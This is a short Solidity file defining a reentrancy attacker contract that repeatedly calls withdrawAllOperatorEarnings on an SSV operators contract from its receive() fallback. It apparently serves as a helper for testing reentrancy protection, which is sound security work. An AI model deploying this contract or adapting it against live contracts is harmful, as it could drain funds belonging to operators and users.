// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

interface ISSVOperators {
    function withdrawAllOperatorEarnings(uint64 operatorId) external;
}

contract ReentrancyAttacker {
    address public target;
    uint64 public operatorId;
    uint256 public counter;
    uint256 public maxTries;

    constructor(address _target, uint256 _maxTries, uint64 _operatorId) {
        target = _target;
        maxTries = _maxTries;
        operatorId = _operatorId;
    }

    function attack() external payable {
        counter = 0;
        ISSVOperators(target).withdrawAllOperatorEarnings(operatorId);
    }

    receive() external payable {
        if (counter < maxTries) {
            counter++;
            try ISSVOperators(target).withdrawAllOperatorEarnings(operatorId) {
            } catch {}
        }
    }
}
